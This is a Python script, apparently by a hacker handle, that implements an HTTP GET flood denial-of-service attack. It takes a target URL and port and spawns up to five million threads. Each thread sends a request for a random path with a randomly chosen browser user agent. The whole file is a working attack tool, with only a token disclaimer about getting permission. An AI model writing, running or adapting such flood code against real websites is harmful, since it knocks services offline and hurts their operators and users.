#!/usr/bin/python3
# Author: 4anonz(Anonymoud Hacks)
# Description: This script is a simple implementation of the http get flood DoS attack.
# Disclaimer: Do not use this tool on any website you don't have permission to.
# By using this tool you agree that you'll be helt responsible for any damage caused.

import sys
import socket
import threading
import string, random, time
from typing import Counter


hostname = ""
ip = ""
port = 0
requests_num = 5000000
counter = 0

whi = "\033[1;37m"
red = "\033[1;31m"
gre = "\033[0;32m"
yel = "\033[1;33m"
pur = "\033[1;35m"
res = "\033[0;37;40m"

USER_AGENTS = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31",
    "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Linux; U; Android 4.2.2; he-il; NEO-X5-116A Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
    "Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.15254",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 6P Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.83 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
    ]
def init():
    global port, ip, requests_num, hostname
    url = ""
    if len(sys.argv) < 2:
        print(f"{whi}[{yel}CRITICAL{whi}]:{res} Missing arguments..")
        print(f"{whi}Usage:{res} {str(sys.argv[0])} <URL> <Port> <Number of requests>")
        exit(1)
    elif len(sys.argv) == 2:
        url = str(sys.argv[1])
    elif len(sys.argv) == 3:
        url = str(sys.argv[1])
        port = int(sys.argv[2])
    elif len(sys.argv) == 4:
        url = str(sys.argv[1])
        port = int(sys.argv[2])
        requests_num = int(sys.argv[3])
    else:
        print(f"{whi}Usage:{res} {str(sys.argv[0])} <URL> <Port> <Number of requests>")
        exit(1)
    # if the protocol is http and no port is available, then use 
    # the default port number for http protocol(80), and also do
    # the same for https
    if 'http' in url:
        if not 'https' in url:
            if port == 0:
                port = 80
        elif 'https' in url:
            port = 443
    if port == 0:
        port = 80
    #parse the URL to get only the hostname
    hostname = url.replace("https://", "").replace("http://", "").replace("www.", "")
    try:
        ip = socket.gethostbyname(hostname)
    except socket.gaierror:
        print(f"{whi}[{yel}CRITICAL{whi}]:{res} Failed to resolve hostname")
        sys.exit(1)


def generate_rand_alpanumeric():
    length = 22
    # Generate a random letters(Upper & lower) and digits
    rand = ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    return rand


def print_status():
    global counter
    counter += 1
    percentage = counter * 100 / requests_num
    sys.stdout.write(f"\r{yel}{int(percentage)}{whi}%{res}  ({counter}/{requests_num})")
    sys.stdout.flush()



# The thread function
def http_get_thread():
    print_status()
    global hostname, port, ip, requests_num
    url_path = generate_rand_alpanumeric()

    #Create a streaming socket
    dos_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        dos_socket.connect((ip, port))
        #Request header
        request_header = (f"GET /{url_path} HTTP/1.1\r\nHost: {hostname}:{port}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nConnection: close\n\n").encode()
        dos_socket.send(request_header)

    except socket.error as err:
        print(f"{whi}[{red}ERROR{whi}]:{res} Socket error '{err}'")
        
    except Exception as err:
        print(f"{whi}[{red}ERROR{whi}]:{res} {err}")
    finally:
        dos_socket.shutdown(socket.SHUT_RDWR)
        dos_socket.close()




if __name__ == '__main__':
    init()
    # List of threads
    threads = list()
    sys.stdout.write(f"{whi}[{yel}INFO{whi}]:{res} Sending HTTP GET request to [{pur}{ip}{res}]\n")
    try:
        for index in range(requests_num):
            x = threading.Thread(target=http_get_thread)
            # add this thread to the thread list
            threads.append(x)
            x.start()

            time.sleep(0.01)
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("\nCtl+C Quitting Attack...!!")
        print(f"\n{whi}[{yel}CRITICAL{whi}]:{res} User aborted(Ctl+C)")
        exit(1)
